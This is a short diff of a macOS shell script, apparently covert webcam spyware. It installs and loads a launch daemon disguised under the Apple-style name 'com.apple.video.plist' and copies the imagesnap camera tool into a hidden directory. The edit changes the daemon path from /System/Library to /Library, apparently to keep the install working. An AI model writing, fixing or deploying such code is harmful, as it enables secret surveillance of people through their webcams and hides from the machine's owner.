@@ -33,10 +33,10 @@ echo '
         <true/>
     </dict>
 </plist>
-' > /System/Library/LaunchDaemons/com.apple.video.plist
+' > /Library/LaunchDaemons/com.apple.video.plist
 
 #Load the LaunchAgent
-launchctl load /System/Library/LaunchDaemons/com.apple.video.plist
+launchctl load /Library/LaunchDaemons/com.apple.video.plist
 
 #Copy imagesnap to the hidden directory
 cp imagesnap $HOME/.hidden
